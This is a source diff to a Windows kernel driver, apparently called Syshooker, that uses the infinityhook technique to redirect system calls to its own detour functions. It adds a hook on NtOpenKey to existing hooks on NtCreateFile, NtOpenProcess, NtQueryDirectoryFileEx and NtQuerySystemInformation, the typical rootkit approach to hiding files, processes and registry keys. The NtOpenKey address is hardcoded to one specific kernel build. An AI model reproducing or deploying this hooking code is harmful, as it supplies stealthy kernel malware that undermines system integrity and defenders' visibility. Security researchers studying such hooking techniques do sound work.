@@ -27,11 +27,14 @@
 #include "NtQueryDirectoryFileEx.h"
 #include "NtOpenProcess.h"
 #include "NtQuerySystemInformation.h"
+#include "NtOpenKey.h"
 
 UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Syshooker");
 
 NTSTATUS SyshookerCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
 NTSTATUS SyshookerWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp);
+
+char CALLBACK_OVERWRITE_ENABLED = 0;
 
 /*
 *	The entry point of the driver. Initializes infinity hook and
@@ -125,6 +128,14 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 		return STATUS_ENTRYPOINT_NOT_FOUND;
 	}
 
+	OriginalNtOpenKey = (NtOpenKey_t)0xfffff80320215790;
+	if (!OriginalNtOpenKey)
+	{
+		//kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtOpenKey);
+		return STATUS_ENTRYPOINT_NOT_FOUND;
+	}
+	else kprintf("[-] infinityhook: NtOpenKey address: %p.\n", OriginalNtOpenKey);
+
 	//
 	// Initialize infinity hook. Each system call will be redirected
 	// to our syscall stub.
@@ -133,6 +144,10 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 	if (!NT_SUCCESS(Status))
 	{
 		kprintf("[-] infinityhook: Failed to initialize with status: 0x%lx.\n", Status);
+	}
+	else
+	{
+		CALLBACK_OVERWRITE_ENABLED = 1;
 	}
 
 	return Status;
@@ -143,6 +158,8 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 */
 void DriverUnload(_In_ PDRIVER_OBJECT DriverObject) {
 	UNREFERENCED_PARAMETER(DriverObject);
+
+	CALLBACK_OVERWRITE_ENABLED = 0;
 
 	//
 	// Unload infinity hook gracefully.
@@ -174,12 +191,14 @@ void __fastcall SyscallStub(
 
 	UNREFERENCED_PARAMETER(SystemCallIndex);
 
+	if (!CALLBACK_OVERWRITE_ENABLED) return;
+
 	// HERE: overwrite the syscall address
 	//
 	// In our demo, we care only about nt!NtCreateFile calls.
 	//
 	if (*SystemCallFunction == OriginalNtCreateFile)
-	{
+	{	
 		//
 		// We can overwrite the return address on the stack to our detoured
 		// NtCreateFile.
@@ -215,6 +234,13 @@ void __fastcall SyscallStub(
 	if (*SystemCallFunction == OriginalNtQuerySystemInformation)
 	{
 		*SystemCallFunction = DetourNtQuerySystemInformation;
+	}
+
+	//NtOpenKey
+	if (*SystemCallFunction == OriginalNtOpenKey)
+	{
+		//kprintf("[+] infinityhook: I can't believe this... %p %p\n", OriginalNtOpenKey, *SystemCallFunction);
+		*SystemCallFunction = DetourNtOpenKey;
 	}
 }
 
